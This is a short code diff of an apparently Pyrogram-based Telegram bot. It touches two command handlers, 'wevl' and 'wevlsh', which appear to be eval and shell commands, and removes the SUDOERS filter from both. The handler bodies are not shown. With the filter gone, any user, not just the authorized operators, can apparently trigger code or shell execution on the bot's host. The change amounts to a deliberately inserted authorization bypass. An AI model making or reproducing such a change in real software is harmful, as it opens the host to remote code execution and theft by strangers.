@@ -44,7 +44,7 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 @app.on_message(
     filters.command("wevl")
-    & SUDOERS
+    
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -152,7 +152,7 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_message(
     filters.command("wevlsh")
-    & SUDOERS
+    
     & ~filters.forwarded
     & ~filters.via_bot
 )
